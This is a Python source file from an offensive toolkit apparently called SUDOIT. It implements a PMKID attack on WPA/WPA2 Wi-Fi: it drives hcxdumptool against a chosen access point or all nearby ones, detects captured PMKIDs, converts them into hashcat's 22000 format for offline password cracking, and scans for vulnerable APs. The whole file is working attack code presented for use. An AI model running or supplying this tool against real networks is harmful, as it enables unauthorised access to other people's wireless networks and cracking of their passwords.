#!/usr/bin/env python3
"""
SUDOIT PMKID Attack Module
Capture PMKID from vulnerable access points without clients.
"""

import os
import time
import subprocess
from datetime import datetime
from typing import Optional, Dict, List

try:
    from core.logger import get_logger
except ImportError:
    import logging
    def get_logger(name="SUDOIT"):
        return logging.getLogger(name)


class PMKIDAttack:
    """
    PMKID Attack Module.
    
    The PMKID (Pairwise Master Key Identifier) attack allows
    capturing WPA/WPA2 handshake material without requiring
    a client to connect/disconnect.
    
    Requirements:
        - hcxdumptool (from hcxtools)
        - hcxpcapngtool (from hcxtools)
        - Monitor mode interface
    """
    
    def __init__(self, interface: str = "wlan0mon", logger=None):
        self.interface = interface
        self.logger = logger or get_logger()
        self.running = False
        self.pmkid_file: Optional[str] = None
        self._proc = None
        self._start_time = None
    
    def attack(self, target_bssid: Optional[str] = None,
               output_file: Optional[str] = None,
               timeout: int = 120) -> Optional[str]:
        """
        Launch PMKID attack against target AP.
        
        Args:
            target_bssid: Target BSSID (None = all APs)
            output_file: Output pcapng file path
            timeout: Max capture time in seconds
        
        Returns:
            Path to pcapng file containing PMKID or None
        """
        self.logger.info(f"Starting PMKID attack (timeout={timeout}s)")
        self.running = True
        self._start_time = time.time()
        
        # Setup output file
        if not output_file:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_file = f"/tmp/sudoit_pmkid_{timestamp}.pcapng"
        
        self.pmkid_file = output_file
        
        # Build command
        cmd = [
            "hcxdumptool",
            "-o", output_file,
            "-i", self.interface,
            "--enable_status=1",
            "--filtermode=2"  # Only WPA
        ]
        
        if target_bssid:
            cmd.extend(["--filterlist_ap", target_bssid])
            print(f"\n[*] PMKID Attack - Target: {target_bssid}")
        else:
            print(f"\n[*] PMKID Attack - All APs")
        
        print(f"[*] Output: {output_file}")
        print(f"[*] Timeout: {timeout}s\n")
        
        try:
            self._proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
            
            pmkid_found = False
            start = time.time()
            
            while time.time() - start < timeout:
                if not self.running:
                    break
                
                line = self._proc.stdout.readline()
                if not line:
                    break
                
                # Show progress
                line = line.strip()
                if line:
                    print(f"  {line}")
                
                # Check for PMKID
                if "PMKID" in line or "PMKID FOUND" in line:
                    pmkid_found = True
                    print(f"\n[✓] PMKID CAPTURED!")
                    break
            
            # Terminate process
            self._proc.terminate()
            self._proc.wait(timeout=5)
            
            elapsed = time.time() - self._start_time if self._start_time else 0
            
            if pmkid_found and os.path.isfile(output_file):
                size = os.path.getsize(output_file)
                print(f"[✓] PMKID saved: {output_file} ({size} bytes)")
                print(f"[*] Time: {elapsed:.1f}s")
                self.logger.info(f"PMKID captured: {output_file}")
                return output_file
            
            print(f"[✗] No PMKID found after {elapsed:.1f}s")
            return None
            
        except FileNotFoundError:
            print(f"[✗] hcxdumptool not found! Install: apt install hcxtools")
            self.logger.error("hcxdumptool not installed")
            return None
        except Exception as e:
            self.logger.error(f"PMKID attack error: {e}")
            print(f"[✗] Error: {e}")
            return None
        finally:
            self.running = False
            self._cleanup()
    
    def convert_pmkid(self, pcapng_file: str, output_file: Optional[str] = None) -> Optional[str]:
        """
        Convert pcapng to hashcat-compatible format (22000).
        
        Args:
            pcapng_file: Input .pcapng file
            output_file: Output hash file
        
        Returns:
            Path to hash file or None
        """
        if not os.path.isfile(pcapng_file):
            print(f"[✗] File not found: {pcapng_file}")
            return None
        
        if not output_file:
            output_file = pcapng_file.replace('.pcapng', '.22000')
        
        print(f"[*] Converting to hashcat format...")
        
        try:
            result = subprocess.run(
                ["hcxpcapngtool", "-o", output_file, pcapng_file],
                capture_output=True, text=True, timeout=30
            )
            
            if os.path.isfile(output_file) and os.path.getsize(output_file) > 0:
                print(f"[✓] Converted: {output_file}")
                return output_file
            else:
                print(f"[✗] Conversion produced empty file")
                return None
                
        except FileNotFoundError:
            print(f"[✗] hcxpcapngtool not found! Install: apt install hcxtools")
            return None
        except Exception as e:
            self.logger.error(f"Conversion error: {e}")
            print(f"[✗] Error: {e}")
            return None
    
    def scan_for_vulnerable(self, timeout: int = 30) -> List[Dict]:
        """
        Quick scan for PMKID-vulnerable APs.
        
        Returns:
            List of vulnerable AP info dicts
        """
        print(f"[*] Scanning for PMKID-vulnerable APs ({timeout}s)...")
        
        temp_file = f"/tmp/sudoit_pmkid_scan_{datetime.now():%Y%m%d_%H%M%S}.pcapng"
        
        result = self.attack(
            target_bssid=None,
            output_file=temp_file,
            timeout=timeout
        )
        
        vulnerable = []
        if result and os.path.isfile(result):
            # Try to extract info
            try:
                proc = subprocess.run(
                    ["hcxpcapngtool", "--csv", result],
                    capture_output=True, text=True, timeout=10
                )
                # Parse CSV output for APs with PMKID
                for line in proc.stdout.split('\n'):
                    if ',' in line and 'PMKID' in line.upper():
                        vulnerable.append({"info": line.strip()})
            except:
                pass
        
        print(f"[*] Found {len(vulnerable)} potentially vulnerable APs")
        return vulnerable
    
    def _cleanup(self):
        """Clean up subprocess."""
        if self._proc:
            try:
                self._proc.terminate()
            except:
                pass
        self.running = False
    
    def stop(self):
        """Stop ongoing attack."""
        self.running = False
        self._cleanup()
        self.logger.info("PMKID attack stopped")
    
    def is_running(self) -> bool:
        """Check if attack is running."""
        return self.running
    
    def get_status(self) -> Dict:
        """Get current attack status."""
        return {
            "running": self.running,
            "output_file": self.pmkid_file,
            "elapsed_time": time.time() - self._start_time if self._start_time else 0
        }
